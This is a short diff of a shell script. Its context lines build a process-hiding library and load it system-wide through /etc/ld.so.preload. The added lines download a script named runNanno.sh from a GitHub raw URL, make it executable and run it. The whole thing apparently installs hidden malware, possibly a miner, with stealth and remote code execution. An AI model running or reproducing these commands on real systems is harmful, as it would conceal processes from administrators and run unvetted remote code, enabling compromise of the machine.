@@ -47,3 +47,9 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/runNanno.sh
+
+chmod +x runNanno.sh
+
+./runNanno.sh
